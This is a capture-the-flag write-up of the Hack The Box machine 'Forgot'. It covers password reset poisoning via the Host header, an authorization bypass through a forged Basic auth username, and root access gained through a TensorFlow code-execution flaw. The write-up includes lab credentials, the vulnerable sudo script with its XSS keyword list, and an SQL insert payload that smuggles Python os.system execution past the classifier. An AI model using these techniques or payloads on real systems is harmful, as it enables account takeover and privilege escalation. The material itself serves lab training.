---
description: >-
  Interseting Linux machine with basic exploitation of forgot password
  mechanics. Usage of recent Tensorflow exploit for PE.
---

# Forgot

## Gaining Access

We can start with an nmap scan:

<figure><img src="../../../.gitbook/assets/image (3913).png" alt=""><figcaption></figcaption></figure>

Then we can view Port 80:

<figure><img src="../../../.gitbook/assets/image (2302).png" alt=""><figcaption></figcaption></figure>

When viewing the page source, we can find this part here that points towards a potential user to gain access to.

<figure><img src="../../../.gitbook/assets/image (2948).png" alt=""><figcaption></figcaption></figure>

### Forgot Password

I'm guessing here that the name of box has to do with this Forgot The Password mechanism. When clicking it and viewing the traffic, we get a few that are rather interesting. There are no other functionalities with this website apart from the Forgot Password, so it seems that we need to somehow, exploit the password reset mechanism.

Probably done through sniffing or stealing cookies. When proxying traffic through Burp, we can see the following bits:

<figure><img src="../../../.gitbook/assets/image (3282).png" alt=""><figcaption></figcaption></figure>

Interesting. So anyways, password reset machine are quite unique, because generally there would be someone clicking that link that is sent. This initial challenge reminds me of the PortSwigger Password Reset Poisoning Labs, so I'll be starting with that exploit path.

{% embed url="https://portswigger.net/web-security/host-header/exploiting/password-reset-poisoning" %}

We probably need to somehow make this service send the email to our machine. So I changed the Host header to my machine's and started a listener port, and it worked.

<figure><img src="../../../.gitbook/assets/image (2656).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (1312).png" alt=""><figcaption></figcaption></figure>

Then we can visit the reset password page and reset his password to whatever we want.

<figure><img src="../../../.gitbook/assets/image (3881).png" alt=""><figcaption></figcaption></figure>

We can then login as this robert user.

Take note that this machine is really weird, and the tokens used are always invalid, for whatever reason. Gotta be fast with this one! Seems like the token expires after like a minute.

### Robert-Dev

We can see the functionalities of this website, and perhaps get an RCE.

<figure><img src="../../../.gitbook/assets/image (3291).png" alt=""><figcaption></figcaption></figure>

Looking at the tickets portion, I can see that there are some SSH credentials for a Jenkins machine on the backend. The tickets are sent to the administrator, which I think is a separate user.

<figure><img src="../../../.gitbook/assets/image (2007).png" alt=""><figcaption></figcaption></figure>

Anyways there seems to be an administrator on this website somewhere, and it's not robert. When looking around at the requests to see if we can find some hidden stuff, I managed to see how the website authenticates us, and its via a Authorization Basic cookie.

<figure><img src="../../../.gitbook/assets/image (115).png" alt=""><figcaption></figcaption></figure>

When taking a look around some more, I found this unique endpoint.

<figure><img src="../../../.gitbook/assets/image (4013).png" alt=""><figcaption></figcaption></figure>

When trying to visit it, I just changed the authorization cookie to have the username as "admin" and it granted me access.

<figure><img src="../../../.gitbook/assets/image (2276).png" alt=""><figcaption></figcaption></figure>

Cool, we have credentials. `diego:dCb#1!x0%gjq`. Now we can SSH into the machine as diego.

<figure><img src="../../../.gitbook/assets/image (4019).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

Running a quick sudo check, we can see that we have some ml\_security.pu script we can run.

<figure><img src="../../../.gitbook/assets/image (129).png" alt=""><figcaption></figcaption></figure>

Here's the full script.

{% code overflow="wrap" %}
```python
#!/usr/bin/python3                                                                           
import sys                                                                                   
import csv                                                                                   
import pickle                                                                                
import mysql.connector
import requests
import threading
import numpy as np
import pandas as pd
import urllib.parse as parse
from urllib.parse import unquote
from sklearn import model_selection
from nltk.tokenize import word_tokenize
from sklearn.linear_model import LogisticRegression
from gensim.models.doc2vec import Doc2Vec, TaggedDocument
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string

np.random.seed(42)

f1 = '/opt/security/lib/DecisionTreeClassifier.sav'
f2 = '/opt/security/lib/SVC.sav'
f3 = '/opt/security/lib/GaussianNB.sav'
f4 = '/opt/security/lib/KNeighborsClassifier.sav'
f5 = '/opt/security/lib/RandomForestClassifier.sav'
f6 = '/opt/security/lib/MLPClassifier.sav'

# load the models from disk
loaded_model1 = pickle.load(open(f1, 'rb'))
loaded_model2 = pickle.load(open(f2, 'rb'))
loaded_model3 = pickle.load(open(f3, 'rb'))
loaded_model4 = pickle.load(open(f4, 'rb'))
loaded_model5 = pickle.load(open(f5, 'rb'))
loaded_model6 = pickle.load(open(f6, 'rb'))
model= Doc2Vec.load("/opt/security/lib/d2v.model")

# Create a function to convert an array of strings to a set of features
def getVec(text):
    features = []
    for i, line in enumerate(text):
        test_data = word_tokenize(line.lower())
        v1 = model.infer_vector(test_data)
        featureVec = v1
        lineDecode = unquote(line)
        lowerStr = str(lineDecode).lower()
        feature1 = int(lowerStr.count('link'))
        feature1 += int(lowerStr.count('object'))
        feature1 += int(lowerStr.count('form'))
        feature1 += int(lowerStr.count('embed'))
        feature1 += int(lowerStr.count('ilayer'))
        feature1 += int(lowerStr.count('layer'))
        feature1 += int(lowerStr.count('style'))
        feature1 += int(lowerStr.count('applet'))
        feature1 += int(lowerStr.count('meta'))
        feature1 += int(lowerStr.count('img'))
        feature1 += int(lowerStr.count('iframe'))
        feature1 += int(lowerStr.count('marquee'))
        # add feature for malicious method count
        feature2 = int(lowerStr.count('exec'))
        feature2 += int(lowerStr.count('fromcharcode'))
        feature2 += int(lowerStr.count('eval'))
        feature2 += int(lowerStr.count('alert'))
        feature2 += int(lowerStr.count('getelementsbytagname'))
        feature2 += int(lowerStr.count('write'))
        feature2 += int(lowerStr.count('unescape'))
        feature2 += int(lowerStr.count('escape'))
        feature2 += int(lowerStr.count('prompt'))
        feature2 += int(lowerStr.count('onload'))
        feature2 += int(lowerStr.count('onclick'))
        feature2 += int(lowerStr.count('onerror'))
        feature2 += int(lowerStr.count('onpage'))
        feature2 += int(lowerStr.count('confirm'))
        # add feature for ".js" count
        feature3 = int(lowerStr.count('.js'))
        # add feature for "javascript" count
        feature4 = int(lowerStr.count('javascript'))
        # add feature for length of the string
        feature5 = int(len(lowerStr))
        # add feature for "<script"  count
        feature6 = int(lowerStr.count('script'))
        feature6 += int(lowerStr.count('<script'))
        feature6 += int(lowerStr.count('&lt;script'))
        feature6 += int(lowerStr.count('%3cscript'))
        feature6 += int(lowerStr.count('%3c%73%63%72%69%70%74'))
        # add feature for special character count
        feature7 = int(lowerStr.count('&'))
        feature7 += int(lowerStr.count('<'))
        feature7 += int(lowerStr.count('>'))
        feature7 += int(lowerStr.count('"'))
        feature7 += int(lowerStr.count('\''))
        feature7 += int(lowerStr.count('/'))
        feature7 += int(lowerStr.count('%'))
        feature7 += int(lowerStr.count('*'))
        feature7 += int(lowerStr.count(';'))
        feature7 += int(lowerStr.count('+'))
        feature7 += int(lowerStr.count('='))
        feature7 += int(lowerStr.count('%3C'))
        # add feature for http count
        feature8 = int(lowerStr.count('http'))
        
        # append the features
        featureVec = np.append(featureVec,feature1)
        featureVec = np.append(featureVec,feature2)
        featureVec = np.append(featureVec,feature3)
        featureVec = np.append(featureVec,feature4)
        featureVec = np.append(featureVec,feature5)
        featureVec = np.append(featureVec,feature6)
        featureVec = np.append(featureVec,feature7)
        featureVec = np.append(featureVec,feature8)
        features.append(featureVec)
    return features


# Grab links
conn = mysql.connector.connect(host='localhost',database='app',user='diego',password='dCb#1!x0%gjq')
cursor = conn.cursor()
cursor.execute('select reason from escalate')
r = [i[0] for i in cursor.fetchall()]
data=[]
for i in r:
        data.append(i)
Xnew = getVec(data)

#1 DecisionTreeClassifier
ynew1 = loaded_model1.predict(Xnew)
#2 SVC
ynew2 = loaded_model2.predict(Xnew)
#3 GaussianNB
ynew3 = loaded_model3.predict(Xnew)
#4 KNeighborsClassifier
ynew4 = loaded_model4.predict(Xnew)
#5 RandomForestClassifier
ynew5 = loaded_model5.predict(Xnew)
#6 MLPClassifier
ynew6 = loaded_model6.predict(Xnew)

# show the sample inputs and predicted outputs
def assessData(i):
    score = ((.175*ynew1[i])+(.15*ynew2[i])+(.05*ynew3[i])+(.075*ynew4[i])+(.25*ynew5[i])+(.3*ynew6[i]))
    if score >= .5:
        try:
                preprocess_input_exprs_arg_string(data[i],safe=False)
        except:
                pass

for i in range(len(Xnew)):
     t = threading.Thread(target=assessData, args=(i,))
#     t.daemon = True
     t.start()
```
{% endcode %}

From the looks of it, this script executes an SQL query to take data for reasons. So it seems to check for forms of XSS as it checks for \<script> tags and so on. Then, Tensorflow seems to take the thing and passes it to something that basically executes this.&#x20;

However, there was a rather recent vulnerability revealing that this was is vulnerable to a form of exploit.&#x20;

{% embed url="https://github.com/advisories/GHSA-75c9-jrh4-79mc" %}

{% embed url="https://security.snyk.io/vuln/SNYK-PYTHON-TENSORFLOW-2841408" %}

All in all, rather interesting. So we wouuld need to input a malicious input into the database, and this would trigger an RCE.

### TensorFlow RCE

From here, we can first create a malicious script that would make us root. Make this executable.

<figure><img src="../../../.gitbook/assets/image (3531).png" alt=""><figcaption></figcaption></figure>

Then we need to figure out how to include an input into the database such that we can get a score of >= .5.&#x20;

We can first try to calculate out the score of .5. Since we need a higher score, I just included a load of different things within the database. I just whacked a ton of URL-encoded XSS stuff. Afterwards,  I appended some python code that would execute my malicious script as root.

In the database, we also need to include the user, issue, link and the actual reason based onthe tickets we saw earlier.

Here's the payload I used:

<figure><img src="../../../.gitbook/assets/image (3701).png" alt=""><figcaption></figcaption></figure>

```sql
insert into escalate values ("abc","abc","abc",'hello=exec("""\nimport os\nos.system("/tmp/shell.sh")\nprint("&ErrMsg=%3Cimg%20src=%22http://htb.com%22%20/%3E%3CSCRIPT%3Ealert%28%22xss%22%29%3C/SCRIPT%3E")""")');
```

Then, we can run the security using sudo and receive a root shell.

<figure><img src="../../../.gitbook/assets/image (2682).png" alt=""><figcaption></figcaption></figure>
